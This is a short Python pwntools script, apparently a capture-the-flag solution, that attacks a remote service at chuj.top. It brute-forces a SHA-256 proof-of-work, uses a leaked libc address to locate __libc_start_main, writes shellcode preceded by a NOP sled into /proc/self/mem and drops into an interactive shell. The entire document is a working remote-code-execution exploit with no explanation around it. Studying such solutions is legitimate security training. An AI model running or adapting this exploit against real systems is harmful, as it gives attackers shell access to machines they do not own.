#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
from pwnlib.util.iters import mbruteforce
import itertools
import base64
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.os = 'linux'
sh = remote("chuj.top", 51617)
sh.recvuntil(') == ')
hash_code = sh.recvuntil('\n', drop=True).decode().strip()
log.success('hash_code={},'.format(hash_code))
charset = string.printable
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() ==
hash_code, charset, 4, method='fixed')
sh.sendlineafter('????> ', proof)
sh.recvuntil("write: ")
write = int(sh.recvuntil('\n', drop = True), base = 16)
log.success('write: ' + hex(write))
libcs = LibcSearcher("write", write)
libc_base = write - libcs.dump("write")
__libc_start_main = libc_base + libcs.dump("__libc_start_main")
log.success("__libc_start_main: " + hex(__libc_start_main))
sh.sendlineafter(">> ", '/proc/self/mem\x00')
sh.sendlineafter(">> ", str(__libc_start_main))
payload = asm(shellcraft.sh()).rjust(0x300, asm('nop')) + b'\n'
sh.sendafter(">> ", payload)
sh.interactive()
